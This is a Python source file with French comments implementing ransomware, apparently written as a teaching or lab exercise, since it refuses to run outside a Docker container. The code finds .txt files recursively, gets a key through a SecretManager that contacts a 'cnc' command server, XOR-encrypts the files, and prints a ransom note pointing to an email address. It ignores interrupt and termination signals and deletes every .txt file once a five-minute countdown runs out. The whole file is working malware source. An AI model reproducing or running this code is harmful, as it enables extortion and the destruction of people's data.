import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os
import signal
import time
import threading

# Adresse du serveur CNC et chemin pour stocker le token
CNC_HOST_PORT = "cnc:6666"
STORAGE_PATH = "/root/token"

# Message de demande de rançon
RANSOM_NOTE = """
Vos fichiers ont été chiffrés. Envoyez un e-mail à "evil@hell.com" avec le titre '{token}' pour récupérer l'accès.
"""

class Ransomware:
    def __init__(self) -> None:
        """
        Initialise l'instance de ransomware et aussi configure la gestion des signaux pour empêcher l'interruption.
        """
        self._logger = logging.getLogger(self.__class__.__name__)
        signal.signal(signal.SIGINT, self._block_exit)
        signal.signal(signal.SIGTERM, self._block_exit)

    def _block_exit(self, *args) -> None:
        """
        Bloque la sortie du programme pour forcer la victime à suivre la procédure de déchiffrement.
        """
        self._logger.info("Sortie bloquée. Veuillez envoyer un email pour récupérer vos données.")

    def _verify_docker(self) -> None:
        """
        Vérifie que le ransomware est exécuté dans un conteneur Docker, sinon, interrompt l'exécution.
        """
        hostname = socket.gethostname()
        if not re.match(r"[0-9a-f]{6,6}", hostname):
            print(f"Erreur : ce malware doit être lancé dans un conteneur Docker (nom d'hôte : {hostname}) !")
            sys.exit(1)

    def _list_files(self, file_extension: str) -> list:
        """
        Récupère tous les fichiers correspondant à l'extension spécifiée.
        """
        return [str(file) for file in Path().rglob(f"*{file_extension}")]

    def encrypt(self) -> None:
        """
        Lance l'opération de chiffrement des fichiers, en démarrant un compte à rebours en arrière-plan.
        """
        countdown_thread = threading.Thread(target=self._countdown, args=(300,))
        countdown_thread.start()

        # Récupération des fichiers texte
        text_files = self._list_files(".txt")

        # Initialisation du gestionnaire de clés
        secret_mgr = SecretManager(remote_host_port=CNC_HOST_PORT, path=STORAGE_PATH)
        secret_mgr.setup()

        # Chiffrement des fichiers
        secret_mgr.xorfiles(text_files)

        # Affichage du message de rançon avec le token hexadécimal
        token_hex = secret_mgr.get_hex_token()
        print(RANSOM_NOTE.format(token=token_hex))

        countdown_thread.join()

    def decrypt(self) -> None:
        """
        Déchiffre les fichiers en demandant la clé de déchiffrement à la victime.
        """
        secret_mgr = SecretManager(remote_host_port=CNC_HOST_PORT, path=STORAGE_PATH)
        secret_mgr.load()

        encrypted_files = self._list_files(".txt")

        while True:
            try:
                b64_key = input("Entrez la clé en base64 : ")
                secret_mgr.set_key(b64_key)
                secret_mgr.xorfiles(encrypted_files)
                secret_mgr.clean()
                self._logger.info("Déchiffrement réussi. Tous les fichiers ont été restaurés.")
                break

            except Exception as e:
                self._logger.error("Clé invalide. Essayez de nouveau.")
                self._logger.debug(f"Détail de l'erreur : {str(e)}")

    def _countdown(self, duration_seconds: int) -> None:
        """
        Compte à rebours avant suppression des fichiers, avertissant la victime du temps restant.
        """
        while duration_seconds > 0:
            mins, secs = divmod(duration_seconds, 60)
            countdown_str = f"{mins:02d}:{secs:02d}"
            print(f"Temps restant avant suppression : {countdown_str}", end="\r")
            time.sleep(1)
            duration_seconds -= 1

        self._logger.warning("Temps écoulé ! Suppression des données en cours.")
        for file in self._list_files(".txt"):
            os.remove(file)
            self._logger.info(f"Fichier supprimé : {file}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
    else:
        ransomware = Ransomware()
        ransomware.encrypt()
